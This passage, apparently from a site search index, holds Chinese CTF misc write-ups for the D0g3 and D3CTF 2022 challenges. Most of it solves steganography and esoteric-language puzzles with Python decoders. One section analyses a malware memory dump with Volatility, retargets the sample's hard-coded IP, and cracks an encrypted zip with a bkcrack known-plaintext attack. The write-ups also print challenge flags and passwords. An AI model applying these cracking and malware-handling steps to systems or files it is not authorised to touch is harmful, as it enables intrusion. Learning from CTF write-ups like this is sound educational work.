\u7b2c\u4e8c\u4e2a\u56fe\u7247\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u50cf\u7d20\u56fe\uff0c\u8f93\u51fa\u4e86\u4e00\u4e0b\uff0c\u989c\u8272\u4e00\u5171\u6709 10 \u79cd\uff1a #800000FF #008000FF #000000FF #0000FFFF #FFFF00FF #00FFFFFF #FF0000FF #00FF00FF #008080FF #808000FF \u6240\u4ee5\u5e94\u8be5\u662f Brainloller \u800c\u4e0d\u662f Piet\uff0c\u4ece\u5728\u7ebf\u7f51\u7ad9 https://minond.xyz/brainloller/ \u6216\u8005\u5199\u4ee3\u7801\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230 brainfuck \u4ee3\u7801 Brainloller\u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ])) -+++++++-+ [ < ++++++++ > - ] < . > +++++++ [ < ++++ > - ] < + . +++++++ .. +++ . >>> ++++++++ [ < ++++ > - ] < . >>> ++++++++++ [ < ++++-++++ > - ] < --- . <<<< . +++ . -+---- . -------- . >> + . \u53ef\u4ee5\u53d1\u73b0\u5b83\u5728\u524d\u9762\u4f1a\u628a\u6307\u9488\u5de6\u79fb\u4e00\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u628a bf \u89e3\u91ca\u5668\u7684 cell \u7684\u521d\u59cb\u6307\u9488\u53f3\u79fb\u4e00\u4f4d\uff08\u6216\u8005\u5728 bf \u4ee3\u7801\u5f00\u5934\u52a0\u4e00\u4e2a > \uff09 \u5f97\u5230\u5bc6\u7801\uff1a 0MTTW_CWZVN! \u7136\u540e\u7528 SilentEye \u89e3\u5bc6\u90a3\u5f20\u56fe\u7247\u5f97\u5230 flag\uff1a D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}","title":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d"},{"location":"writeups/d0g3/#writeup","text":"Abstract \u8fd9\u6b21\u7684 misc \u7b97\u662f\u505a\u5f97\u6bd4\u8f83\u597d\uff0c\u4e0b\u9762\u662f writeup","title":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b Writeup"},{"location":"writeups/d0g3/#cthulhu-mythos","text":"hint.mp3 \u5f00\u5934\u662f\u300aOverworld Day\u300b\u6cf0\u62c9\u745e\u4e9aOST \u540e\u9762\u662fSSTV\uff0cScottie1\u6a21\u5f0f\u3002\u5f97\u5230\u56fe\u7247\uff1a MRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32 \u89e3\u7801\uff1a d_Try_Terr4ria!} \u4ece\u56fe\u7247\u4e5f\u80fd\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a Base32 \u7684\u540e\u534a\u90e8\u5206\uff0c\u9700\u8981\u627e\u524d\u9762\u7684\u4e00\u622a \u7136\u540e\u6253\u5f00\u90a3\u4e2awld\u6587\u4ef6\uff1a 7I4YF6QLO \u4ed4\u7ec6\u627e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u56db\u4e2a\u7bb1\u5b50\uff1a \u7bb1\u5b50 3\u6761\u62fc\u5728\u4e00\u8d77\u662f\u5b8c\u6574\u7684 Base32 IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32\uff1a D0g3{M1necR4ft_G0_And_Try_Terr4ria!}","title":"Cthulhu Mythos"},{"location":"writeups/d0g3/#lovemath","text":"\u6839\u636e\u9898\u5e72\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8981\u7528\u5230 Tupper's Self-Referential Formula \u5148\u770b\u538b\u7f29\u5305 flag\u649eCRC\u6821\u9a8c \u5bc6\u7801: th1s_Is_Y0ur_pa33w0rd_We1c0m3e \u89e3\u538b\u51fa\u6765\u7684\u56fe\u7247: \u8fd9\u4e2a\u4e22\u8fdb stegsolve \u540e red 0 \u6bd4\u8f83\u8be1\u5f02\uff0c\u6240\u4ee5\u7528 LSB \u9690\u5199\u8bd5\u8bd5 \u5220\u6389\u5f00\u5934\u7684\u810f\u6570\u636e\u5f97\u5230\uff1a \u8fd9\u4e2a\u8f6c\u6587\u5b57\u8f93\u5230 Tupper's Self-Referential Formula \u7684\u5728\u7ebf\u7f51\u7ad9 https://tuppers-formula.ovh/ \u91cc 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352 D0g3{I_LOV3_math}","title":"lovemath"},{"location":"writeups/d0g3/#cyzcc_loves_lol","text":"\u5f00\u59cb\u662f LOLcode \uff0c\u8f6c\u6362\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801 AGdJfpqebmXpptloa \u5f97\u5230\u4e24\u5f20\u56fe\u7247\uff0c\u4e00\u5f20\u540d\u5b57\u662f jinx's_flag_in_silent.jpg \u63a8\u6d4b\u662f\u7528\u4e86 SilentEye \u8fd9\u4e2a\u8f6f\u4ef6\u85cf\u4e86 flag\uff0c\u9700\u8981\u4e00\u4e2a\u5bc6\u7801 \u7b2c\u4e8c\u4e2a\u56fe\u7247\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u50cf\u7d20\u56fe\uff0c\u8f93\u51fa\u4e86\u4e00\u4e0b\uff0c\u989c\u8272\u4e00\u5171\u6709 10 \u79cd\uff1a #800000FF #008000FF #000000FF #0000FFFF #FFFF00FF #00FFFFFF #FF0000FF #00FF00FF #008080FF #808000FF \u6240\u4ee5\u5e94\u8be5\u662f Brainloller \u800c\u4e0d\u662f Piet\uff0c\u4ece\u5728\u7ebf\u7f51\u7ad9 https://minond.xyz/brainloller/ \u6216\u8005\u5199\u4ee3\u7801\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230 brainfuck \u4ee3\u7801 Brainloller\u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ])) -+++++++-+ [ < ++++++++ > - ] < . > +++++++ [ < ++++ > - ] < + . +++++++ .. +++ . >>> ++++++++ [ < ++++ > - ] < . >>> ++++++++++ [ < ++++-++++ > - ] < --- . <<<< . +++ . -+---- . -------- . >> + . \u53ef\u4ee5\u53d1\u73b0\u5b83\u5728\u524d\u9762\u4f1a\u628a\u6307\u9488\u5de6\u79fb\u4e00\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u628a bf \u89e3\u91ca\u5668\u7684 cell \u7684\u521d\u59cb\u6307\u9488\u53f3\u79fb\u4e00\u4f4d\uff08\u6216\u8005\u5728 bf \u4ee3\u7801\u5f00\u5934\u52a0\u4e00\u4e2a > \uff09 \u5f97\u5230\u5bc6\u7801\uff1a 0MTTW_CWZVN! \u7136\u540e\u7528 SilentEye \u89e3\u5bc6\u90a3\u5f20\u56fe\u7247\u5f97\u5230 flag\uff1a D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}","title":"CyzCC_loves_LOL"},{"location":"writeups/d3ctf2022/","text":"D 3 CTF 2022 Writeup \u00b6 Abstract D 3 \uff08Vidar\u3001L\u3001CNSS\uff09\u548c AntSRC \u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u9898\u76ee\u8f83\u5c11\uff0c\u4f46\u96be\u5ea6\u4e0d\u4f4e BadW3ter \u00b6 \u6587\u4ef6\u5934\uff1a \u5c06 CUY1nw31lai \u6539\u4e3a RIFFWAVEfmt \u5c31\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u64ad\u653e \u7531\u9898\u76ee\u4e2d deeper and deeper \u63a8\u6d4b\u4f7f\u7528 deepsound \u8fdb\u884c\u9690\u5199 \u4f7f\u7528 deepsound \u914d\u5408 CUY1nw31lai \u5bc6\u7801\u5f97\u5230 \u660e\u663e\u662f\u53e0\u52a0\u540e\u7684\u574f\u6389\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u626b\u63cf Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down \u7531\u4e8e\u662f tiff \u6587\u4ef6\uff0c\u4f1a\u81ea\u5e26\u56fe\u5c42\uff0c\u5220\u6389\u767d\u8272\u80cc\u666f\u56fe\u5c42 \u5957\u7528\u5e7b\u5f71\u5766\u514b\u4ee3\u7801\uff1a import cv2 import numpy as np import argparse if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = '\u63d0\u53d6\u5e7b\u5f71\u5766\u514b' ) parser . add_argument ( 'input' , help = '\u8f93\u5165\u56fe' ) parser . add_argument ( 'output1' , help = '\u8f93\u51fa\u9690\u85cf\u7684\u56fe' ) parser . add_argument ( 'output2' , help = '\u8f93\u51fa\u76f4\u63a5\u5c55\u793a\u7684\u56fe' ) arg = parser . parse_args () img_in = cv2 . imread ( arg . input , cv2 . IMREAD_UNCHANGED ) if len ( img_in . shape ) < 3 or img_in . shape [ 2 ] != 4 : parser . error ( '\u4f60\u7684\u56fe\u7247\u4e0d\u542balpha\u901a\u9053\uff01' ) b = img_in [:, :, 0 ] . astype ( np . float ) g = img_in [:, :, 1 ] . astype ( np . float ) r = img_in [:, :, 2 ] . astype ( np . float ) a = img_in [:, :, 3 ] . astype ( np . float ) out1 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out2 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out1 [:, :, 0 ] = b * a / 255 out1 [:, :, 1 ] = g * a / 255 out1 [:, :, 2 ] = r * a / 255 out2 [:, :, 0 ] = 255 - ( 255 - b ) * a / 255 out2 [:, :, 1 ] = 255 - ( 255 - g ) * a / 255 out2 [:, :, 2 ] = 255 - ( 255 - r ) * a / 255 out1 = np . clip ( np . floor ( out1 ), 0 , 255 ) . astype ( np . uint8 ) out2 = np . clip ( np . floor ( out2 ), 0 , 255 ) . astype ( np . uint8 ) cv2 . imwrite ( arg . output1 , out1 ) cv2 . imwrite ( arg . output2 , out2 ) \u5f97\u5230 \uff08\u6216\u8005\u76f4\u63a5\u5728 PS \u91cc\u6539\u80cc\u666f\uff09 \u53ef\u4ee5\u626b\u63cf\u51fa flag\uff1a D3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?} WannaWacca \u00b6 \u4f7f\u7528 Volatility \u5de5\u5177\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\uff0c\u901a\u8fc7 netscan \u547d\u4ee4\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u8fdb\u7a0b\u53f7 1404 vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 netscan vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 dumpfiles - Q 0x000000003dec4a70 -- dump - dir =./ Smart . exe \u5f97\u5230 SmartFalcon.exe \u8fdb\u884c upx \u8131\u58f3\uff0c\u4e4b\u540e\u518d\u4fee\u6539\u6076\u610f\u8f6f\u4ef6\u7684 ip (114.116.210.244) \u4fe1\u606f\u5230\u81ea\u5df1\u4e3b\u673a\uff0c\u901a\u8fc7\u7ed9\u7684 pcap \u6d41\u91cf\u91cd\u653e\u6d41\u91cf\u5bf9\u538b\u7f29\u7684 flag.zip \u8fdb\u884c\u89e3\u538b \u5bf9\u89e3\u5bc6\u540e\u7684 flag.zip \u7528 bkcrack \u901a\u8fc7 png \u6587\u4ef6\u5934\u8fdb\u884c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230 key\uff1abd363f25 3a7da3aa 4bbe3175\uff0c\u89e3\u538b flag.zip \u5f97\u5230\u4e0b\u56fe\uff1a \u660e\u663e\u7684\u5f69\u8272\u6a2a\u6761\u548c\u80cc\u666f\u82f9\u679c\u6697\u793a\uff0c\u5728\u82f9\u679c\u7684 png \u89e3\u6790\u4e2d\u4f1a\u5448\u73b0\u4e0d\u540c\u7684\u56fe\u50cf\uff1a \u5206\u522b\u53d1\u73b0\u4e0a\u8fb9\u548c\u53f3\u4e0b\u89d2\u6709\u610f\u4e49\u4e0d\u660e\u7684\u767d\u8272\u50cf\u7d20\u70b9 \u518d\u7531\u6587\u4ef6\u540d I can\u2019t see any light \u53ef\u4ee5\u63a8\u6d4b\u662f\u76f2\u6587\uff0c\u5e76\u4e14\u7279\u5f81\u660e\u663e\u53ef\u4ee5\u7ffb\u8bd1 \u4e0a\u8fb9\u7684\u5f00\u5934\u5c31\u662f\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u70b9\u53d1\u73b0\u662f 504B0304\uff0czip \u6587\u4ef6\u5934\uff0c\u5168\u90e8\u8bfb\u53d6\uff1a import numpy as np from PIL import Image img = Image . open ( \"braille.png\" ) width , height = size = img . size arr = np . array ( img ) BLACK = np . array ([ 0 , 0 , 0 , 255 ]) WHITE = np . array ([ 255 , 255 , 255 , 255 ]) B00 = np . array ([ BLACK , BLACK ]) B01 = np . array ([ BLACK , WHITE ]) B10 = np . array ([ WHITE , BLACK ]) B11 = np . array ([ WHITE , WHITE ]) num_flag = 0 def convert ( code ): global num_flag if ( code == np . array ([ B01 , B01 , B11 ])) . all (): num_flag = 1 return \"num\" if ( code == np . array ([ B10 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"1\" else : return \"a\" if ( code == np . array ([ B10 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"2\" else : return \"b\" if ( code == np . array ([ B11 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"3\" else : return \"c\" if ( code == np . array ([ B11 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"4\" else : return \"d\" if ( code == np . array ([ B10 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"5\" else : return \"e\" if ( code == np . array ([ B11 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"6\" else : return \"f\" if ( code == np . array ([ B11 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"7\" else : return \"g\" if ( code == np . array ([ B10 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"8\" else : return \"h\" if ( code == np . array ([ B01 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"9\" else : return \"i\" if ( code == np . array ([ B01 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"0\" else : return \"j\" for i in range ( 4 ): for j in range ( 960 ): now = arr [ i * 3 : i * 3 + 3 , j * 2 : j * 2 + 2 ] res = convert ( now ) if res != \"num\" and res != None : print ( res , end = \"\" ) \u7c98\u8d34\u5165 Hex Fiend\uff0c\u89e3\u538b\u5f97\u5230 Future will lead.txt \u6587\u4ef6\uff0c\u662f The Ray of Light \u6b4c\u8bcd\u6df7\u5165\u4e86\u4e00\u4e9b 0x7F \u5b57\u7b26 \u82f9\u679c\u89e3\u91ca\u5668\u53f3\u4e0b\u89d2\u7684\u5185\u5bb9\u76f4\u63a5\u8bfb\u53d6\u65e0\u6cd5\u8bfb\u51fa\u6709\u6548\u5185\u5bb9\uff0c\u8003\u8651\u7ffb\u8f6c 180 \u5ea6\u4ece\u5de6\u5230\u53f3\u8bfb\u53d6\uff0c\u53d1\u73b0\u5927\u5199\u6807\u8bc6\uff0c\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6 \u4eba\u5de5\u8bfb\u53d6\uff1a VGV4dF9ibGluZF93YXRlcm1hcmsgcHdkIGlzOiBSQHkwZjEhOWh0 base64\u89e3\u7801\uff1a Text_blind_watermark pwd is: R@y0f1!9ht guofei9987/text_blind_watermark from text_blind_watermark import extract print ( f \"d3ctf {{ { extract ( open ( 'Future will lead.txt' , 'r' ) . read (), 'R@y0f1!9ht' ) . strip () } }} \" ) flag: d3ctf{b576241258a44b868ea25804b0ec1d4e}","title":"D3CTF 2022"},{"location":"writeups/d3ctf2022/#d3ctf-2022-writeup","text":"Abstract D 3 \uff08Vidar\u3001L\u3001CNSS\uff09\u548c AntSRC \u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u9898\u76ee\u8f83\u5c11\uff0c\u4f46\u96be\u5ea6\u4e0d\u4f4e","title":"D3CTF 2022 Writeup"},{"location":"writeups/d3ctf2022/#badw3ter","text":"\u6587\u4ef6\u5934\uff1a \u5c06 CUY1nw31lai \u6539\u4e3a RIFFWAVEfmt \u5c31\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u64ad\u653e \u7531\u9898\u76ee\u4e2d deeper and deeper \u63a8\u6d4b\u4f7f\u7528 deepsound \u8fdb\u884c\u9690\u5199 \u4f7f\u7528 deepsound \u914d\u5408 CUY1nw31lai \u5bc6\u7801\u5f97\u5230 \u660e\u663e\u662f\u53e0\u52a0\u540e\u7684\u574f\u6389\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u626b\u63cf Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down \u7531\u4e8e\u662f tiff \u6587\u4ef6\uff0c\u4f1a\u81ea\u5e26\u56fe\u5c42\uff0c\u5220\u6389\u767d\u8272\u80cc\u666f\u56fe\u5c42 \u5957\u7528\u5e7b\u5f71\u5766\u514b\u4ee3\u7801\uff1a import cv2 import numpy as np import argparse if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = '\u63d0\u53d6\u5e7b\u5f71\u5766\u514b' ) parser . add_argument ( 'input' , help = '\u8f93\u5165\u56fe' ) parser . add_argument ( 'output1' , help = '\u8f93\u51fa\u9690\u85cf\u7684\u56fe' ) parser . add_argument ( 'output2' , help = '\u8f93\u51fa\u76f4\u63a5\u5c55\u793a\u7684\u56fe' ) arg = parser . parse_args () img_in = cv2 . imread ( arg . input , cv2 . IMREAD_UNCHANGED ) if len ( img_in . shape ) < 3 or img_in . shape [ 2 ] != 4 : parser . error ( '\u4f60\u7684\u56fe\u7247\u4e0d\u542balpha\u901a\u9053\uff01' ) b = img_in [:, :, 0 ] . astype ( np . float ) g = img_in [:, :, 1 ] . astype ( np . float ) r = img_in [:, :, 2 ] . astype ( np . float ) a = img_in [:, :, 3 ] . astype ( np . float ) out1 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out2 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out1 [:, :, 0 ] = b * a / 255 out1 [:, :, 1 ] = g * a / 255 out1 [:, :, 2 ] = r * a / 255 out2 [:, :, 0 ] = 255 - ( 255 - b ) * a / 255 out2 [:, :, 1 ] = 255 - ( 255 - g ) * a / 255 out2 [:, :, 2 ] = 255 - ( 255 - r ) * a / 255 out1 = np . clip ( np . floor ( out1 ), 0 , 255 ) . astype ( np . uint8 ) out2 = np . clip ( np . floor ( out2 ), 0 , 255 ) . astype ( np . uint8 ) cv2 . imwrite ( arg . output1 , out1 ) cv2 . imwrite ( arg . output2 , out2 ) \u5f97\u5230 \uff08\u6216\u8005\u76f4\u63a5\u5728 PS \u91cc\u6539\u80cc\u666f\uff09 \u53ef\u4ee5\u626b\u63cf\u51fa flag\uff1a D3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?}","title":"BadW3ter"},{"location":"writeups/d3ctf2022/#wannawacca","text":"\u4f7f\u7528 Volatility \u5de5\u5177\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\uff0c\u901a\u8fc7 netscan \u547d\u4ee4\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u8fdb\u7a0b\u53f7 1404 vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 netscan vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 dumpfiles - Q 0x000000003dec4a70 -- dump - dir =./ Smart . exe \u5f97\u5230 SmartFalcon.exe \u8fdb\u884c upx \u8131\u58f3\uff0c\u4e4b\u540e\u518d\u4fee\u6539\u6076\u610f\u8f6f\u4ef6\u7684 ip (114.116.210.244) \u4fe1\u606f\u5230\u81ea\u5df1\u4e3b\u673a\uff0c\u901a\u8fc7\u7ed9\u7684 pcap \u6d41\u91cf\u91cd\u653e\u6d41\u91cf\u5bf9\u538b\u7f29\u7684 flag.zip \u8fdb\u884c\u89e3\u538b \u5bf9\u89e3\u5bc6\u540e\u7684 flag.zip \u7528 bkcrack \u901a\u8fc7 png \u6587\u4ef6\u5934\u8fdb\u884c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230 key\uff1abd363f25 3a7da3aa 4bbe3175\uff0c\u89e3\u538b flag.zip \u5f97\u5230\u4e0b\u56fe\uff1a \u660e\u663e\u7684\u5f69\u8272\u6a2a\u6761\u548c\u80cc\u666f\u82f9\u679c\u6697\u793a\uff0c\u5728\u82f9\u679c\u7684 png \u89e3\u6790\u4e2d\u4f1a\u5448\u73b0\u4e0d\u540c\u7684\u56fe\u50cf\uff1a \u5206\u522b\u53d1\u73b0\u4e0a\u8fb9\u548c\u53f3\u4e0b\u89d2\u6709\u610f\u4e49\u4e0d\u660e\u7684\u767d\u8272\u50cf\u7d20\u70b9 \u518d\u7531\u6587\u4ef6\u540d I can\u2019t see any light \u53ef\u4ee5\u63a8\u6d4b\u662f\u76f2\u6587\uff0c\u5e76\u4e14\u7279\u5f81\u660e\u663e\u53ef\u4ee5\u7ffb\u8bd1 \u4e0a\u8fb9\u7684\u5f00\u5934\u5c31\u662f\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u70b9\u53d1\u73b0\u662f 504B0304\uff0czip \u6587\u4ef6\u5934\uff0c\u5168\u90e8\u8bfb\u53d6\uff1a import numpy as np from PIL import Image img = Image . open ( \"braille.png\" ) width , height = size = img . size arr = np . array ( img ) BLACK = np . array ([ 0 , 0 , 0 , 255 ]) WHITE = np . array ([ 255 , 255 , 255 , 255 ]) B00 = np . array ([ BLACK , BLACK ]) B01 = np . array ([ BLACK , WHITE ]) B10 = np . array ([ WHITE , BLACK ]) B11 = np . array ([ WHITE , WHITE ]) num_flag = 0 def convert ( code ): global num_flag if ( code == np . array ([ B01 , B01 , B11 ])) . all (): num_flag = 1 return \"num\" if ( code == np . array ([ B10 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"1\" else : return \"a\" if ( code == np . array ([ B10 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"2\" else : return \"b\" if ( code == np . array ([ B11 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"3\" else : return \"c\" if ( code == np . array ([ B11 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"4\" else : return \"d\" if ( code == np . array ([ B10 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"5\" else : return \"e\" if ( code == np . array ([ B11 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"6\" else : return \"f\" if ( code == np . array ([ B11 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"7\" else : return \"g\" if ( code == np . array ([ B10 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"8\" else : return \"h\" if ( code == np . array ([ B01 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"9\" else : return \"i\" if ( code == np . array ([ B01 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"0\" else : return \"j\" for i in range ( 4 ): for j in range ( 960 ): now = arr [ i * 3 : i * 3 + 3 , j * 2 : j * 2 + 2 ] res = convert ( now ) if res != \"num\" and res != None : print ( res , end = \"\" ) \u7c98\u8d34\u5165 Hex Fiend\uff0c\u89e3\u538b\u5f97\u5230 Future will lead.txt \u6587\u4ef6\uff0c\u662f The Ray of Light \u6b4c\u8bcd\u6df7\u5165\u4e86\u4e00\u4e9b 0x7F \u5b57\u7b26 \u82f9\u679c\u89e3\u91ca\u5668\u53f3\u4e0b\u89d2\u7684\u5185\u5bb9\u76f4\u63a5\u8bfb\u53d6\u65e0\u6cd5\u8bfb\u51fa\u6709\u6548\u5185\u5bb9\uff0c\u8003\u8651\u7ffb\u8f6c 180 \u5ea6\u4ece\u5de6\u5230\u53f3\u8bfb\u53d6\uff0c\u53d1\u73b0\u5927\u5199\u6807\u8bc6\uff0c\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6 \u4eba\u5de5\u8bfb\u53d6\uff1a 